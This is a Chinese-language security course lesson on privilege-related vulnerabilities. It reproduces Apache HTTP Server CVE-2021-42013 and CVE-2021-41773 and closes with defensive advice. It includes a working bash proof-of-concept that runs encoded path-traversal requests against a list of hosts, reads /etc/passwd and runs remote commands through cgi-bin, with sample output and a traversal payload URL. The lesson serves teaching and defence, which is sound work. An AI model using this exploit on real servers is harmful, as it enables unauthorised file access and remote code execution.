你好，我是王昊天。

在多年的电脑使用经历中，你肯定经历过这种画面：

下载了官方软件却没有正版授权，于是千辛万苦找到一个破解软件，但是在运行破解软件时不断被杀毒软件拦截，一怒之下你把杀毒软件关闭了，随着破解软件的成功消息弹出，你露出了满意的微笑……

3天后你的电脑由于病毒感染无法开机了。

这是一种很典型的场景——为了某些临时性的操作破坏了权限边界，进而导致安全问题的发生。其实， **除了临时性的操作，还有很多权限安全问题是长期性的**，可能是配置原因、也可能是代码原因，接下来就让我们来一起探究。

## 权限不合理

**权限不合理简单来说，是不合理的权限赋予、权限处理以及权限管理过程**。这里所说的权限，指的是终端角色的一种属性。那么什么是终端角色呢？你可以理解为，用户就是一个终端角色。

与权限相关的赋予、处理以及管理过程，我们主要通过权限管理来统一实现。权限管理就是能够赋予终端执行某种特殊操作的权利，比如在某些运维场景下，运维人员能够获得系统维护的权限，这其中就包括重启服务器权限——我们都知道服务器重启可不是常规操作权限。

**接下来我们以运行时权限过高为例，来看几种典型的攻击场景。**

应用软件在执行某些操作时可能会获取过高的权限，这就可能会破坏我们之前课程中提到的最小权限原则，如果因为这种原因导致了提权漏洞的发生，就可能会放大其他安全风险，导致严重后果。

随着应用软件执行权限的提高，比如运行在root或者Administrator权限，操作系统或者软件环境提供的安全检查可能会失效；更进一步，由于操作环境权限提升，已经存在的中低危安全风险可能因此升级为高危安全漏洞。

**1\. 高权限运行应用**

在安装和运行组件的过程中，某些程序组件的运行环境设置的权限过高，导致低权限应用通过服务调用关系可以完成提权操作。

与开发层面相比，这一类问题的发生更多倾向于运维层面，比较典型的场景如：攻击者通过WebApp挖掘出注入类型的漏洞，而数据库运行在root或者Administrator权限，则可以通过注入提权的方式尝试远程命令执行。

**2\. 降权时出现异常**

以下代码尝试去创建一个用户文件夹，在此操作期间进行了短暂提权：

```python
def makeNewUserDir(username):
    ...
    try:
        raisePrivileges()
        os.mkdir('/home/' + username)
        lowerPrivileges()
    except OSError:
        return False
    ...

```

上述代码包含了一次短暂提权，开发者在完成目标操作后立即进行了降权，但要注意的是username作为一个外部输入的参数，可能由于各种原因（输入不合法、安全过滤不严格等）导致mkdir函数报错进而抛出异常，一旦触发这种情况lowerPrivileges函数就无法得到执行，程序将持续以高权限状态运行，可能会为后续漏洞利用过程提供舒适的环境。

## 案例实战

#### CVE-2021-42013 简介

这是一个Apache服务器中存在的高危安全漏洞，会导致服务器路径遍历、关键文件泄露以及远程命令执行漏洞。

有趣的是，该漏洞是CVE-2021-41773的兄弟漏洞，CVE-2021-41773影响的软件版本是2.4.49，该软件版本在2021-09-15发布，在修复了CVE-2021-41773漏洞后，开发团队于2021-10-04发布了2.4.50版本，但是在新版本发布的次日，安全研究人员就发现对CVE-2021-41773漏洞的修复并不完善，会导致一个变种漏洞的发生——CVE-2021-42013。经过apache确认问题后，再次发布了2.4.51版本。

关于apache服务器历史源码的下载，可以在apache官网找到链接： [Index of /dist/httpd](https://archive.apache.org/dist/httpd/)

#### CVE-2021-42013 漏洞复现

这里我们提供了两种实验方案：你可以从源码编译安装，也可以直接使用MiTuan搭建好的环境。

**我们先来看看第一种方案，如何通过源码编译安装httpd。**

我们首先访问apache官网，选择2.4.50版本下载：

[https://archive.apache.org/dist/httpd/httpd-2.4.50.tar.gz](https://archive.apache.org/dist/httpd/httpd-2.4.50.tar.gz)

通过Docker或者虚拟机启动一台Ubuntu Server，如下是httpd编译安装前的环境依赖：

```bash
apt install libapr1 libapr1-dev
apt install libaprutil1 libaprutil1-dev
apt install libpcre3 libpcre3-dev

```

然后编译安装即可：

```bash
# Extract
tar -xvf httpd-2.4.50.tar.gz
cd httpd-2.4.50
# Configure
./configure
# Compile
make
# Install
make install
# Test
/usr/local/apache/bin/apachectl -k start

```

这里要注意在完全默认配置下该漏洞是不存在的，这里我们需要对配置文件做简单的修改：

```plain
# 1.
<Directory />
    Require all granted
</Directory>
# 2.
LoadModule cgid_module modules/mod_cgid.so

```

上述的代码主要做了两处修改。一是许可了Apache服务器对文件系统的访问操作，二是加载了一个Module。

要知道，在部署WebApp的过程中这两处修改是非常普遍的，因此该漏洞的影响范围非常大。

通过netstat -antp命令可以查看服务状态：

```bash
root@1dd54d1b3962:/home# netstat -antp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      26722/httpd

```

**我们来来看看第二种方案，尝试使用MiTuan直接启动环境。**

我已经构建好了标准的2.4.50版本httpd服务器环境，你可以访问 [MiTuan](http://mituan.zone)，直接搜索\[极客时间-漏洞挖掘与智能攻防实战\]并选择\[CVE-2021-42013\]来进行测试。

PoC代码如下：

```
#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
  echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
  echo ./PoC.sh targets.txt /etc/passwd
  echo ./PoC.sh targets.txt /bin/sh id
  exit
fi

for host in $(cat $1);
do
  echo $host
  if [[ $3 == '' ]]; then
    curl -v --path-as-is "$host/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2";
    exit
  fi
  curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2";
done

```

执行PoC代码：

```bash
root@1dd54d1b3962:/home# ./CVE-2021-42013.sh targets.txt /etc/passwd
127.0.0.1
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...

root@1dd54d1b3962:/home# ./CVE-2021-42013.sh targets.txt /bin/sh id
http://127.0.0.1
uid=1(daemon) gid=1(daemon) groups=1(daemon)

```

可以看到我们可以通过该漏洞访问到 `/etc/passwd` 文件，并且执行命令获取当前环境的用户信息。

#### CVE-2021-41773 漏洞分析

在成功利用漏洞之后，接下来我们要探究一下漏洞的具体成因。考虑到CVE-2021-42013与CVE-2021-41773是兄弟漏洞，CVE-2021-42013是由于修复不完善导致的变形，所以这里我们从CVE-2021-41773分析入手。

CVE-2021-41773影响的是Apache HTTP Server 2.4.49版本，因此我们可以：从官网下载对应的源代码，使用常用的编辑器查看： [https://archive.apache.org/dist/httpd/httpd-2.4.49.tar.gz](https://archive.apache.org/dist/httpd/httpd-2.4.49.tar.gz)，或者通过MiTuan的CVE-2021-42013漏洞环境查看。MiTuan的漏洞环境中的 `/home/httpd-2.4.49` 包含了对应的源码，同时也内置了vim编辑器。

与本漏洞相关的核心代码位于 `/home/httpd-2.4.49/server/util.c` 文件，核心函数是 `ap_normalize_path(char *path, unsigned int flags)`，漏洞相关代码如下：

```c++
|    while (path[l] != '\0') {
-        /* RFC-3986 section 2.3:
2         *  For consistency, percent-encoded octets in the ranges of
2         *  ALPHA (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D),
2         *  period (%2E), underscore (%5F), or tilde (%7E) should [...]
2         *  be decoded to their corresponding unreserved characters by
2         *  URI normalizers.
2         */
2        // 老师添加的注释 - part1
2        if ((flags & AP_NORMALIZE_DECODE_UNRESERVED)
-                && path[l] == '%' && apr_isxdigit(path[l + 1])
-                                  && apr_isxdigit(path[l + 2])) {
3            const char c = x2c(&path[l + 1]);
3            if (apr_isalnum(c) || (c && strchr("-._~", c))) {
-                /* Replace last char and fall through as the current
4                 * read position */
4                l += 2;
4                path[l] = c;
3            }
2        }
-           ...
2        if (w == 0 || IS_SLASH(path[w - 1])) {
-            /* Collapse ///// sequences to / */
3            if ((flags & AP_NORMALIZE_MERGE_SLASHES) && IS_SLASH(path[l])) {
-                do {
-                    l++;
4                } while (IS_SLASH(path[l]));
4                continue;
3            }
3
3            // 老师添加的注释 - part2
3            if (path[l] == '.') {
-                /* Remove /./ segments */
4                if (IS_SLASH_OR_NUL(path[l + 1])) {
-                    l++;
5                    if (path[l]) {
-                        l++;
5                    }
5                    continue;
4                }
4                /* Remove /xx/../ segments */
4                if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) {
-                    /* Wind w back to remove the previous segment */
5                    if (w > 1) {
-                        do {
-                            w--;
6                        } while (w && !IS_SLASH(path[w - 1]));
5                    }

```

根据我在源码中添加的注释，可以定位关键代码段：

- 注释1：


  检测到路径中存在%字符时，如果紧跟的2个字符是十六进制字符，就会进行url解码，将其转换成标准字符。

  效果： `%2e -> .`

- 注释2：


  判断是否存在 `../` ，如果路径中存在 `%2e./` 形式，就会检测到，但是出现 `.%2e/` 这种形式时，就不会检测到。

  效果：使用 `.%2e/` 或者 `%2e %2e` 绕过对路径穿越符的检测。


由此，即可构建PoC代码：

```
 $host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/password

```

好的，至此我们已经成功从代码中分析清楚CVE-2021-41773漏洞的成因，并且构建了能够利用漏洞的PoC代码。接下来我们要学习如何从安全建设和开发的角度来防御这种风险。

## 防御及检测

针对权限相关的安全问题，在三个不同的阶段，我们分别有不同的方式加以防御和检测。

**在架构设计阶段**，你可以使用“最小权限原则”来运行你的代码，如果可能的话，为你的任务代码创建一个独立的、拥有受限权限的账户。在这种情况下，即使攻击者的完成了一次入侵，也很难直接威慑到软件系统的其他部分。举例来说，数据库应用很少以DBA的形式长时间运行。

另外，你需要识别出需要额外权限的函数，并做好“权限隔离”。\*\*可以通过封装的方式，尽可能的将高权限需求函数与其他代码分割开，同时尽量晚地进行提权操作，以及尽量早地进行降权操作，防止外部任何可能干扰高权限代码段的输入发生。

**在开发实现阶段**，你需要对于高权限代码段要给予足够的关注，在输入检测层面要提供更严格的审核以及限制策略。

当进行降权时，不要忘记额外调用检测函数以确保权限被成功降低，防止出现降权函数执行失败导致权限没有降低的情况。

**在系统配置阶段**，对于复杂应用系统，你要确保配置文件得到良好的审计，配置文件往往会大幅度影响应用系统的权限级别。

## 总结

这节课我们学习了一种很常见但是很重要的安全风险——权限相关的漏洞。

这种漏洞有时与运维相关，由高权限运行应用导致；有时与开发代码相关，由开发时降权失败导致，对此我们分别列举了典型的攻击场景。

然后我们找到了一个2021年发生高危漏洞——CVE-2021-42013，它是一个由于配置不当引发的权限相关的漏洞，成功利用可以导致文件越权访问以及远程代码执行。

通过搭建环境并进行PoC代码编写，我们成功完成了漏洞的复现，掌握了CVE-2021-42013的使用。

但是会使用一个漏洞只是量的积累，我们更希望以点及面，从这个漏洞入手进而掌握这一类漏洞的原理。为了分析漏洞原理，我们追踪了它的兄弟漏洞——CVE-2021-41773，这是CVE-2021-42013漏洞的前一版本，正是由于开发人员更新时针对CVE-2021-41773的修复不完整，才导致了CVE-2021-42013的发生。

接下来我们又从源码层面挖掘漏洞的根源。

你需要判断是否存在 `../`，如果路径中存在 `%2e./` 形式，就会检测到，但是出现 `.%2e/` 这种形式时 ，就不会检测到。这一漏洞是由于输入检测不严格，导致用户能够进行输入绕过，完成命令执行。

从本质上来看，问题发生的根源是过滤不严格导致的安全漏洞，关于输入过滤的问题我们已经在前几节课中探讨过，这节课我们更多的是关注存在问题时，我们应该如何做安全建设：

1. 通过函数封装、用户隔离等方式最小权限运行代码；
2. 对高权限代码给予额外的输入检测以及函数检查；
3. 对复杂应用系统的配置文件进行安全审计。

通过结合前几节课程中提到的输入过滤等安全策略，这种多维度、多层次的安全建设，可以更有效地提高应用系统的整体安全性。

## 思考题

这节课我们研究了CVE-2021-41773 漏洞，你可以继续完成CVE-2021-42013 漏洞的分析吗？

欢迎在评论区留下你的思考，我们下节课再见。